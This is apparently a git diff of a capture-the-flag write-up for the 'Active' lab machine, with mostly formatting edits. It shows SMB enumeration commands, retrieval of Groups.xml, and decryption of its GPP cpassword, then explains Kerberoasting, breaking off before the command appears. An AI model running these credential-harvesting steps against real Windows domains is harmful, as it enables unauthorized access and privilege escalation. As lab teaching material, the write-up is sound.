@@ -1,7 +1,7 @@
-Machine Name: Active  
-Machine Ip: 10.129.26.196  
-Type: Windows  
-Difficulity: Easy  
+# Machine Name: Active  
+# Machine Ip: 10.129.26.196  
+# Type: Windows  
+# Difficulity: Easy  
 
 First of all, as usual I made a port scan to see which ports are open, then I looked through their versions by this command:  
 ```bash
@@ -118,7 +118,7 @@ Host script results:
 |_  0/4 checks are positive: Host is CLEAN or ports are blocked
 
 ```
-I checked anonymour rpc connection but it failed:  
+I checked **anonymous rpc** connection but it failed:  
 ```bash
 ┌──(faridd㉿Ferid)-[~/Downloads/active]
 └─$ rpcclient -U "" 10.129.26.196 -N
@@ -126,7 +126,7 @@ rpcclient $> enumdomusers
 do_cmd: Could not initialise samr. Error was NT_STATUS_ACCESS_DENIED
 rpcclient $> 
 ```
-So, let's try smbclient:  
+So, let's try **smbclient**:  
 ```bash
 ┌──(faridd㉿Ferid)-[~/Downloads/active]
 └─$ smbclient -L //10.129.26.196/ -N                 
@@ -145,7 +145,7 @@ Reconnecting with SMB1 for workgroup listing.
 do_connect: Connection to 10.129.26.196 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
 Unable to connect with SMB1 -- no workgroup available
 ```
-I didn't have access to Users folder but in Replication share, I found several folders and files. If you want to analyse the files faster and effectively, you can activate "recursive" mode and search them in this way.  
+I didn't have access to **Users** folder but in **Replication** share, I found several folders and files. If you want to analyse the files faster and effectively, you can activate **"recursive" mode** and search them in this way.  
 ```bash
 smb: \active.htb\> recurse ON
 smb: \active.htb\> ls
@@ -161,11 +161,11 @@ GPT.INI
 GptTmpl.inf
 ```
 There are the found files.   
-GPT.INI, GPE.INI - They are default file and useless most time.   
-GptTmpl.inf, Registry.pol - They can be useful sometimes. First one shows which privileges the user have, password policy and other information. The second one stores registry configurations. Sometimes we can see specific configurations that were applied by the system.       
-Groups.xml - This is your main target on this machine. In older Windows systems, when administrators set a new user or password via Group Policy, that information is stored in this XML file, specifically encrypted within the cpassword section. Since Microsoft officially released this encryption key (AES) in 2012, it can be easily decrypted using the gpp-decrypt tool.     
+**GPT.INI, GPE.INI** - They are default file and useless most time.   
+**GptTmpl.inf, Registry.pol** - They can be useful sometimes. First one shows which privileges the user have, password policy and other information. The second one stores registry configurations. Sometimes we can see specific configurations that were applied by the system.       
+**Groups.xml** - This is your main target on this machine. In older Windows systems, when administrators set a new user or password via Group Policy, that information is stored in this XML file, specifically encrypted within the **cpassword** section. Since Microsoft officially released this **encryption key (AES) in 2012**, it can be easily decrypted using the **gpp-decrypt** tool.     
 
-So let's download it to our kali.   
+So let's download it into our kali.   
 ```bash
 ┌──(faridd㉿Ferid)-[~/Downloads/active]
 └─$ smbclient //10.129.26.196/Replication -N
@@ -181,7 +181,7 @@ smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Prefere
 <Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
 </Groups>
 ```
-As you can see we got credentials from there. The "username" = "SVC_TGS" and the "cpassword" is "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ". We can easily decrypt this password by the help of gpp-decrypt tool.    
+As you can see we got credentials from there. The **"username" = "SVC_TGS"** and the **"cpassword" is "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"**. We can easily decrypt this password by the help of **gpp-decrypt tool**.    
 ```bash
 ┌──(faridd㉿Ferid)-[~/Downloads/active]
 └─$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
@@ -222,16 +222,16 @@ smb: \> ls
 		5217023 blocks of size 4096. 277689 blocks available
 smb: \> 
 ```
-We can get the user.txt file from the /Svc_TGS/Desktop folder. Which folders will not help us anyway?   
-All Users - It is D(directory) + H(hidden) + S(system) + r(read-only) + n(Not Content Indexed). It means it is system protected hidden files and there is nothing for a user to do. So, do not waste your time by checking DHSrn permission folders.     
-Default / Default User - They are Default folders and do not store useful information for a hacker.   
-desktop.ini - This is just a configuration file that tells Windows how to set the folder's icon or appearance. It doesn't contain any interesting information.    
-Public - is open for everyone, sometimes it can store confidential data but in this CTF we will look at SVC_TGS folder at first. In this way we got the user flag.     
+We can get the **user.txt** file from the **/Svc_TGS/Desktop** folder. Which folders will not help us anyway?   
+**All Users** - It is D(directory) + H(hidden) + S(system) + r(read-only) + n(Not Content Indexed). It means it is system protected hidden files and there is nothing for a user to do. So, do not waste your time by checking DHSrn permission folders.     
+**Default / Default User** - They are Default folders and do not store useful information for a hacker.   
+**desktop.ini** - This is just a configuration file that tells Windows how to set the folder's icon or appearance. It doesn't contain any interesting information.    
+**Public** - is open for everyone, sometimes it can store confidential data but in this CTF we will look at SVC_TGS folder at first. In this way we got the user flag.     
 
 ----
 # Privilege Escalation   
-The username is SVC_TGS. This name is often assigned to service accounts that are associated with a Service Principal Name (SPN). In Windows, such accounts are vulnerable to Kerberosing attacks.       
-Logic: We will request a ticket (TGS Ticket) from Kerberos for this service. The ticket we receive will be hashed with the user's password. We can crack that hash offline to obtain the Administrator (or other high-level) password.     
+The username is **SVC_TGS**. This name is often assigned to service accounts that are associated with a **Service Principal Name (SPN)**. In Windows, such accounts are vulnerable to **Kerberosing** attacks.       
+Logic: We will request a ticket **(TGS Ticket)** from Kerberos for this service. The ticket we receive will be hashed with the user's password. We can crack that hash offline to obtain the **Administrator** (or other high-level) password.     
 
 Just run this command on your kali:   
 ```bash
